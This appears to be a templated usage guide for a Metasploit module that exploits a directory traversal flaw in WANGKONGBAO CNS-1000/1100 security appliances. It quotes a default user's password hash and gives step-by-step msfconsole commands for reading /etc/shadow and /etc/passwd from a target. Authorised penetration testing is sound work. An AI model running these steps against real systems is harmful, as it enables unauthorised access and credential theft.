**The description of current metasploit exploit**
This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka          Network Security Platform. This directory traversal vulnerability is interesting          because the apache server is running as root, this means we can grab anything we          want! For instance, the /etc/shadow and /etc/passwd files for the special          kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wangkongbao_traversal
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 85 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.